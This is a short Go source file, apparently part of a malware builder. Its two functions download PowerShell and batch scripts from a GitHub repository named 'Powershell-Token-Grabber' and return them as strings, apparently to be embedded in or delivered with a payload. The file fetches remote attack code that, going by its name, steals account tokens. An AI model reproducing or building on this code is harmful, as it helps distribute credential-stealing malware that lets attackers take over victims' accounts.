package static

import (
	"io"
	"net/http"
)

func GetPowershellCode() string {
	codeUrl := "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1"

	res, err := http.Get(codeUrl)
	if err != nil {
		return ""
	}

	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return ""
	}

	return string(body)
}

func GetBatCode() string {
	codeUrl := "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.bat"

	res, err := http.Get(codeUrl)
	if err != nil {
		return ""
	}

	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return ""
	}

	return string(body)
}
